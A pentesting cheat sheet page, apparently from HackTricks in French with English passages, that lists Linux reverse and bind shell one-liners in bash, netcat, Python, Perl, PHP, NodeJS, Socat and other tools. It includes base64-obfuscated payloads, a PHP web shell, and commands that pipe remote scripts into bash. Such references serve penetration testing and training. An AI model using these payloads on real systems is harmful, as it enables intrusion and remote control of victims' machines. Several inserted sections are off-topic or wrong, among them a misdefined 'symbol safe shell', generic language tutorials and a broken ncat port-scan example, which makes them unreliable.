# Shells - Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menace proactives, trouve des problèmes dans toute votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Si vous avez des questions sur l'un de ces shells, vous pouvez les vérifier avec** [**https://explainshell.com/**](https://explainshell.com)

## TTY complet

**Une fois que vous avez un shell inversé**[ **lisez cette page pour obtenir un TTY complet**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
### Shell sécurisé par symboles

A symbol safe shell is a type of shell that is designed to prevent command injection attacks by properly handling special characters and symbols. It ensures that any input containing symbols or special characters is treated as literal text and not interpreted as commands.

To use a symbol safe shell, you need to escape or quote any input that contains symbols or special characters. This can be done using backslashes (\) or enclosing the input in single quotes ('') or double quotes ("").

For example, if you want to pass a file name that contains spaces to a command, you would need to escape the spaces using backslashes or enclose the file name in quotes. Here are some examples:

- Escaping spaces using backslashes:
```
$ command /path/to/file\ with\ spaces.txt
```

- Enclosing the file name in single quotes:
```
$ command '/path/to/file with spaces.txt'
```

- Enclosing the file name in double quotes:
```
$ command "/path/to/file with spaces.txt"
```

By using a symbol safe shell and properly escaping or quoting input, you can significantly reduce the risk of command injection attacks and ensure the security of your system.
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Explication du shell

1. **`bash -i`**: Cette partie de la commande lance un shell interactif (`-i`) Bash.
2. **`>&`**: Cette partie de la commande est une notation abrégée pour **rediriger à la fois la sortie standard** (`stdout`) et **l'erreur standard** (`stderr`) vers la **même destination**.
3. **`/dev/tcp/<IP-ATTAQUANT>/<PORT>`**: Il s'agit d'un fichier spécial qui **représente une connexion TCP à l'adresse IP et au port spécifiés**.
* En **redirigeant les flux de sortie et d'erreur vers ce fichier**, la commande envoie efficacement la sortie de la session shell interactive vers la machine de l'attaquant.
4. **`0>&1`**: Cette partie de la commande **redirige l'entrée standard (`stdin`) vers la même destination que la sortie standard (`stdout`)**.

### Créer un fichier et exécuter
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Shell Avant

Il se peut que vous rencontriez des cas où vous avez une **RCE dans une application web sur une machine Linux**, mais en raison des règles Iptables ou d'autres types de filtrage, **vous ne pouvez pas obtenir un shell inversé**. Ce "shell" vous permet de maintenir un shell PTY via cette RCE en utilisant des pipes à l'intérieur du système de la victime.\
Vous pouvez trouver le code sur [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)

Il vous suffit de modifier :

* L'URL de l'hôte vulnérable
* Le préfixe et le suffixe de votre charge utile (le cas échéant)
* La manière dont la charge utile est envoyée (en-têtes ? données ? informations supplémentaires ?)

Ensuite, vous pouvez simplement **envoyer des commandes** ou même **utiliser la commande `upgrade`** pour obtenir un shell PTY complet (notez que les pipes sont lus et écrits avec un délai approximatif de 1,3 seconde).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

Vérifiez-le sur [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
Telnet is a network protocol used for remote access to computers. It allows users to connect to a remote host and interact with it using a command-line interface. Telnet is often used for troubleshooting network issues, testing connectivity, and managing remote systems.

To establish a Telnet connection, you need to know the IP address or hostname of the remote host. You can then use a Telnet client to connect to the remote host on port 23, which is the default port for Telnet.

Once connected, you can enter commands on the remote host just as if you were physically present at the machine. Telnet sessions are not encrypted, so it is important to use Telnet only on trusted networks or in controlled environments.

To exit a Telnet session, you can usually type "exit" or "quit" and press Enter. This will close the connection and return you to your local machine.

Telnet can be a useful tool for remote administration and troubleshooting, but it is important to use it securely and be aware of the potential risks associated with unencrypted communication.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Attaquant**
```bash
while true; do nc -l <port>; done
```
Pour envoyer la commande, écrivez-la, appuyez sur Entrée et appuyez sur CTRL+D (pour arrêter STDIN)

**Victime**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Python is a versatile and powerful programming language that is widely used in the field of hacking. It provides a wide range of libraries and modules that can be leveraged for various hacking tasks. In this section, we will explore some of the common Python libraries and techniques used in hacking.

### Reverse Shell

A reverse shell is a technique used by hackers to gain remote access to a target system. It involves establishing a connection from the target system to the attacker's machine, allowing the attacker to execute commands on the target system. Python provides several libraries, such as `socket` and `subprocess`, that can be used to implement a reverse shell.

Here is an example of a simple reverse shell script in Python:

```python
import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("attacker_ip", attacker_port))
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        s.send(output.stdout.read())
        s.send(output.stderr.read())
    s.close()

connect()
```

In this script, the `socket` library is used to establish a TCP connection with the attacker's machine. The `subprocess` library is used to execute commands on the target system and capture the output. The script continuously listens for commands from the attacker and sends the output back to the attacker.

### Web Scraping

Web scraping is the process of extracting data from websites. It can be used for various purposes in hacking, such as gathering information about potential targets or scraping sensitive data. Python provides powerful libraries, such as `requests` and `BeautifulSoup`, that make web scraping easy.

Here is an example of a simple web scraping script in Python:

```python
import requests
from bs4 import BeautifulSoup

url = "https://example.com"
response = requests.get(url)
soup = BeautifulSoup(response.text, "html.parser")

# Extracting all links from the webpage
links = soup.find_all("a")
for link in links:
    print(link.get("href"))
```

In this script, the `requests` library is used to send an HTTP request to the specified URL and retrieve the webpage content. The `BeautifulSoup` library is used to parse the HTML content and extract specific elements, such as links.

### Password Cracking

Password cracking is the process of recovering passwords from stored or transmitted data. It is often used by hackers to gain unauthorized access to systems or accounts. Python provides several libraries, such as `hashlib` and `bcrypt`, that can be used for password cracking.

Here is an example of a simple password cracking script in Python:

```python
import hashlib

password = "password123"
hash = hashlib.md5(password.encode()).hexdigest()

# Brute forcing the password
for i in range(1000000):
    guess = str(i).zfill(6)
    if hashlib.md5(guess.encode()).hexdigest() == hash:
        print("Password cracked:", guess)
        break
```

In this script, the `hashlib` library is used to calculate the MD5 hash of a given password. The script then iterates through a range of possible passwords and compares their hashes with the target hash. If a match is found, the password is considered cracked.

These are just a few examples of how Python can be used in hacking. Python's simplicity and extensive library support make it a popular choice among hackers.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
Perl est un langage de programmation polyvalent et puissant qui peut être utilisé pour diverses tâches, y compris le piratage éthique. Il est souvent utilisé pour automatiser des tâches répétitives et pour manipuler des données. Perl est également connu pour sa capacité à traiter des expressions régulières, ce qui en fait un outil précieux pour l'analyse de fichiers et la recherche de vulnérabilités.

Lorsqu'il s'agit de piratage éthique, Perl peut être utilisé pour créer des scripts personnalisés qui aident à l'exploitation de vulnérabilités spécifiques. Par exemple, Perl peut être utilisé pour automatiser des attaques par force brute, des attaques par injection SQL et des attaques par débordement de tampon.

Perl offre également une grande flexibilité en termes de manipulation de fichiers et de réseautage. Il peut être utilisé pour lire, écrire et modifier des fichiers, ainsi que pour communiquer avec des serveurs distants via des sockets. Cette fonctionnalité est particulièrement utile lors de l'exploration de réseaux et de la recherche de vulnérabilités.

En tant que pirate éthique, il est important de maîtriser Perl et de comprendre ses fonctionnalités et ses capacités. Cela vous permettra d'exploiter pleinement le potentiel de ce langage de programmation et de l'utiliser de manière efficace et responsable dans vos activités de piratage éthique.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby est un langage de programmation dynamique et orienté objet. Il est souvent utilisé pour le développement web et est connu pour sa syntaxe élégante et sa facilité d'utilisation.

### Installation de Ruby

Pour commencer à utiliser Ruby, vous devez d'abord l'installer sur votre système. Voici les étapes pour installer Ruby sur Linux :

1. Ouvrez un terminal.
2. Exécutez la commande suivante pour mettre à jour les paquets de votre système :
```
sudo apt update
```
3. Ensuite, installez Ruby en exécutant la commande suivante :
```
sudo apt install ruby-full
```
4. Une fois l'installation terminée, vérifiez que Ruby est correctement installé en exécutant la commande suivante :
```
ruby --version
```
Vous devriez voir la version de Ruby installée sur votre système.

### Exécution de scripts Ruby

Une fois que Ruby est installé, vous pouvez exécuter des scripts Ruby en utilisant l'interpréteur Ruby. Voici comment exécuter un script Ruby :

1. Créez un nouveau fichier avec l'extension `.rb`, par exemple `script.rb`.
2. Ouvrez le fichier avec un éditeur de texte et ajoutez votre code Ruby.
3. Enregistrez le fichier.
4. Ouvrez un terminal et naviguez jusqu'au répertoire contenant le fichier Ruby.
5. Exécutez le script en utilisant la commande suivante :
```
ruby script.rb
```
Le script Ruby sera exécuté et vous verrez la sortie dans le terminal.

### Utilisation de l'interpréteur Ruby

En plus d'exécuter des scripts Ruby à partir de fichiers, vous pouvez également utiliser l'interpréteur Ruby en mode interactif. Voici comment lancer l'interpréteur Ruby :

1. Ouvrez un terminal.
2. Exécutez la commande suivante pour lancer l'interpréteur Ruby :
```
irb
```
3. Vous verrez un prompt Ruby (`irb(main):001:0>`) où vous pouvez entrer du code Ruby et l'exécuter immédiatement.
4. Pour quitter l'interpréteur Ruby, utilisez la commande `exit`.

L'interpréteur Ruby en mode interactif est utile pour tester rapidement des morceaux de code et expérimenter avec le langage.

### Conclusion

Ruby est un langage de programmation puissant et polyvalent. En suivant les étapes d'installation et en apprenant à exécuter des scripts Ruby, vous serez en mesure de commencer à développer des applications web et à explorer les fonctionnalités de Ruby.
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP est un langage de script côté serveur largement utilisé pour le développement web. Il est principalement utilisé pour générer des pages web dynamiques et peut être intégré dans du code HTML. PHP est compatible avec de nombreux systèmes d'exploitation, y compris Linux.

### Configuration du shell PHP

Pour configurer un shell PHP sur un système Linux, vous pouvez suivre les étapes suivantes :

1. Ouvrez un terminal et accédez au répertoire où vous souhaitez créer le shell PHP.
2. Créez un nouveau fichier avec l'extension `.php`, par exemple `shell.php`.
3. Ouvrez le fichier avec un éditeur de texte et ajoutez le code PHP suivant :

```php
<?php
    system($_GET['cmd']);
?>
```

Ce code permet d'exécuter des commandes système à partir de la requête GET. Assurez-vous de comprendre les risques associés à l'exécution de commandes système à partir d'une requête utilisateur.

4. Enregistrez le fichier et fermez l'éditeur de texte.

### Utilisation du shell PHP

Une fois que vous avez configuré le shell PHP, vous pouvez l'utiliser pour exécuter des commandes système sur le serveur. Voici comment procéder :

1. Ouvrez un navigateur web et accédez à l'URL du shell PHP, par exemple `http://example.com/shell.php`.
2. Ajoutez le paramètre `cmd` à l'URL, suivi de la commande que vous souhaitez exécuter. Par exemple, pour exécuter la commande `ls -la`, l'URL serait `http://example.com/shell.php?cmd=ls%20-la`.
3. Appuyez sur Entrée pour envoyer la requête GET.
4. Le résultat de la commande s'affichera dans le navigateur.

Assurez-vous de limiter l'accès au shell PHP uniquement aux utilisateurs autorisés et de prendre des mesures de sécurité appropriées pour protéger votre serveur contre les attaques potentielles.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java est un langage de programmation populaire utilisé pour développer des applications sur diverses plateformes. Il est connu pour sa portabilité, sa sécurité et sa facilité d'utilisation. Voici quelques méthodologies et ressources couramment utilisées pour travailler avec Java :

### Environnement de développement intégré (IDE)

Un IDE est un outil essentiel pour développer des applications Java. Il offre des fonctionnalités telles que l'édition de code, le débogage, la compilation et le déploiement. Certains des IDE populaires pour Java sont :

- Eclipse : un IDE open source largement utilisé avec une grande communauté de développeurs.
- IntelliJ IDEA : un IDE commercial avec des fonctionnalités avancées pour le développement Java.
- NetBeans : un IDE open source qui prend en charge le développement Java, ainsi que d'autres langages de programmation.

### Frameworks

Les frameworks Java sont des bibliothèques logicielles qui fournissent une structure pour développer des applications. Ils facilitent le développement en offrant des fonctionnalités prêtes à l'emploi. Voici quelques-uns des frameworks Java populaires :

- Spring : un framework léger et puissant pour le développement d'applications d'entreprise.
- Hibernate : un framework de persistance des données qui facilite l'interaction avec la base de données.
- Struts : un framework MVC (Modèle-Vue-Contrôleur) pour le développement d'applications Web.

### Outils de construction

Les outils de construction sont utilisés pour automatiser le processus de construction et de déploiement des applications Java. Ils permettent de gérer les dépendances, de compiler le code source et de créer des artefacts exécutables. Voici quelques-uns des outils de construction populaires pour Java :

- Apache Maven : un outil de gestion de projet qui facilite la construction, le test et le déploiement des applications Java.
- Gradle : un système de construction polyvalent qui prend en charge plusieurs langages de programmation, y compris Java.
- Ant : un outil de construction flexible et extensible pour Java.

### Documentation

La documentation est essentielle pour comprendre et utiliser efficacement les bibliothèques, les frameworks et les outils Java. Voici quelques ressources de documentation utiles :

- JavaDocs : la documentation officielle de Java, qui fournit des informations détaillées sur les classes et les méthodes.
- Tutoriels en ligne : de nombreux sites web proposent des tutoriels gratuits pour apprendre Java et ses frameworks.
- Livres : il existe de nombreux livres sur Java et ses frameworks, qui couvrent différents niveaux de compétence.

En utilisant ces méthodologies et ressources, vous pouvez développer des applications Java efficaces et de haute qualité.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat is a powerful networking utility that is included in the Nmap suite. It is designed to be a flexible and reliable tool for network exploration and security auditing. Ncat provides a wide range of features, including port scanning, banner grabbing, and data transfer capabilities.

### Installation

Ncat is available for various operating systems, including Linux, Windows, and macOS. To install Ncat on Linux, you can use the package manager of your distribution. For example, on Debian-based systems, you can run the following command:

```
sudo apt-get install nmap
```

### Basic Usage

Ncat can be used for a variety of purposes, such as establishing a simple TCP or UDP connection, creating a secure tunnel, or transferring files between systems. Here are some examples of basic usage:

- To establish a TCP connection to a remote host on a specific port:

```
ncat <host> <port>
```

- To listen for incoming TCP connections on a specific port:

```
ncat -l <port>
```

- To transfer a file from one system to another using TCP:

```
ncat -l <port> > file.txt
ncat <host> <port> < file.txt
```

### Advanced Features

Ncat also offers advanced features that can be useful for network troubleshooting and penetration testing. Some of these features include:

- **Port scanning**: Ncat can be used to scan for open ports on a target system. For example, to scan the top 1000 ports on a remote host, you can use the following command:

```
ncat -v -p 1-1000 <host>
```

- **Banner grabbing**: Ncat can retrieve banners from network services running on a target system. This can provide valuable information about the services and their versions. For example, to grab the banner from a web server running on port 80, you can use the following command:

```
ncat -v <host> 80
```

- **Encryption and authentication**: Ncat supports various encryption and authentication methods, allowing you to secure your network connections. For example, to establish an encrypted connection using SSL/TLS, you can use the following command:

```
ncat --ssl <host> <port>
```

### Conclusion

Ncat is a versatile and powerful networking utility that can be used for a wide range of tasks. Whether you need to establish a simple connection, transfer files, or perform advanced network analysis, Ncat has you covered. Its flexibility and reliability make it an essential tool for any network administrator or security professional.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua est un langage de programmation léger, extensible et puissant. Il est souvent utilisé pour l'écriture de scripts et l'automatisation de tâches. Lua est également largement utilisé dans le domaine du jeu vidéo en raison de sa simplicité et de sa flexibilité.

### Installation de Lua

Pour installer Lua sur un système Linux, vous pouvez utiliser le gestionnaire de paquets de votre distribution. Par exemple, sur Ubuntu, vous pouvez exécuter la commande suivante :

```bash
sudo apt-get install lua5.3
```

### Exécution de scripts Lua

Une fois Lua installé, vous pouvez exécuter des scripts Lua en utilisant l'interpréteur de ligne de commande `lua`. Par exemple, pour exécuter un script Lua nommé `script.lua`, vous pouvez exécuter la commande suivante :

```bash
lua script.lua
```

### Syntaxe de base

Lua utilise une syntaxe simple et concise. Voici quelques exemples de syntaxe de base en Lua :

#### Variables

```lua
-- Déclaration d'une variable
local x = 10

-- Affichage de la valeur de la variable
print(x)
```

#### Boucles

```lua
-- Boucle while
local i = 1
while i <= 10 do
    print(i)
    i = i + 1
end

-- Boucle for
for i = 1, 10 do
    print(i)
end
```

#### Conditions

```lua
local x = 10

-- Condition if
if x > 5 then
    print("x est supérieur à 5")
elseif x < 5 then
    print("x est inférieur à 5")
else
    print("x est égal à 5")
end
```

### Fonctions

Lua prend en charge les fonctions. Voici un exemple de déclaration et d'appel de fonction en Lua :

```lua
-- Déclaration d'une fonction
function add(a, b)
    return a + b
end

-- Appel de la fonction
local result = add(5, 3)
print(result)
```

### Conclusion

Lua est un langage de programmation puissant et flexible, idéal pour l'écriture de scripts et l'automatisation de tâches. Avec sa syntaxe simple et sa facilité d'utilisation, Lua est un excellent choix pour les développeurs.
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJS est une plateforme de développement JavaScript côté serveur qui utilise le moteur JavaScript V8 de Google Chrome. Elle permet d'exécuter du code JavaScript en dehors du navigateur, ce qui en fait un choix populaire pour le développement d'applications web et de serveurs.

### Installation

Pour installer NodeJS, vous pouvez suivre les étapes suivantes :

1. Rendez-vous sur le site officiel de NodeJS : [https://nodejs.org](https://nodejs.org)
2. Téléchargez la version correspondant à votre système d'exploitation (Windows, macOS, Linux, etc.).
3. Lancez le programme d'installation et suivez les instructions à l'écran.
4. Une fois l'installation terminée, vous pouvez vérifier si NodeJS est correctement installé en ouvrant une fenêtre de terminal et en tapant la commande suivante :

```bash
node --version
```

Si tout s'est bien passé, vous devriez voir s'afficher la version de NodeJS installée sur votre machine.

### Utilisation

NodeJS est principalement utilisé pour exécuter des scripts JavaScript côté serveur. Voici comment vous pouvez exécuter un script NodeJS :

1. Créez un fichier JavaScript avec l'extension `.js`, par exemple `script.js`.
2. Ouvrez une fenêtre de terminal et naviguez jusqu'au répertoire contenant votre fichier JavaScript.
3. Tapez la commande suivante pour exécuter le script :

```bash
node script.js
```

Le script sera exécuté et vous verrez les résultats affichés dans la fenêtre de terminal.

### Modules

NodeJS dispose d'un système de modules qui permet d'organiser et de réutiliser du code. Voici comment vous pouvez utiliser un module dans votre script NodeJS :

1. Installez le module à l'aide de l'outil de gestion des paquets npm (Node Package Manager). Par exemple, pour installer le module `express`, vous pouvez exécuter la commande suivante :

```bash
npm install express
```

Cela téléchargera et installera le module `express` dans votre projet.

2. Dans votre script JavaScript, importez le module en utilisant la fonction `require`. Par exemple, pour importer le module `express`, vous pouvez ajouter la ligne suivante en haut de votre fichier :

```javascript
const express = require('express');
```

Vous pouvez maintenant utiliser les fonctionnalités du module `express` dans votre script.

### Conclusion

NodeJS est une plateforme puissante pour le développement côté serveur en JavaScript. En suivant les étapes d'installation et en utilisant les modules, vous pouvez commencer à développer des applications web et des serveurs avec NodeJS.
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

L'attaquant (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
La Victime
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Shell de liaison

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

Ce code permet de créer un shell de liaison en utilisant Socat. Le shell de liaison écoute sur le port 4444 et exécute `/bin/bash` lorsqu'une connexion est établie.
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Reverse shell

Un shell inversé est une technique utilisée en piratage informatique pour établir une connexion entre un système compromis et un attaquant distant. Cela permet à l'attaquant d'exécuter des commandes sur le système compromis à distance, en contournant les pare-feu et en évitant la détection.

Pour établir un shell inversé, l'attaquant doit d'abord compromettre le système cible en exploitant une vulnérabilité ou en utilisant des techniques d'ingénierie sociale. Une fois le système compromis, l'attaquant installe un programme malveillant sur le système qui se connecte à un serveur contrôlé par l'attaquant.

Lorsque le programme malveillant est exécuté sur le système compromis, il établit une connexion sortante vers le serveur de l'attaquant. Cette connexion permet à l'attaquant d'envoyer des commandes au système compromis et de recevoir les résultats.

Les shells inversés sont souvent utilisés par les pirates informatiques pour maintenir un accès persistant à un système compromis. Une fois qu'un shell inversé est établi, l'attaquant peut exécuter des commandes à distance, télécharger ou téléverser des fichiers, voler des informations sensibles et effectuer d'autres activités malveillantes.

Il existe de nombreux outils et scripts disponibles pour créer des shells inversés sur les systèmes Linux. Certains des outils populaires incluent Netcat, Metasploit Framework et PowerShell Empire. Ces outils offrent des fonctionnalités avancées pour faciliter l'établissement et la gestion de shells inversés.

Il est important de noter que l'utilisation de shells inversés pour des activités malveillantes est illégale et peut entraîner des poursuites judiciaires. Les informations fournies ici sont uniquement à des fins éducatives et doivent être utilisées de manière responsable et légale.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk est un langage de programmation polyvalent utilisé pour manipuler et analyser des données. Il est souvent utilisé dans les tâches de traitement de texte et de manipulation de fichiers. Awk fonctionne en lisant un fichier ligne par ligne et en appliquant des actions spécifiques aux lignes qui correspondent à des motifs donnés.

Voici un exemple simple d'utilisation d'Awk pour extraire des informations d'un fichier :

```bash
awk '/motif/ { action }' fichier
```

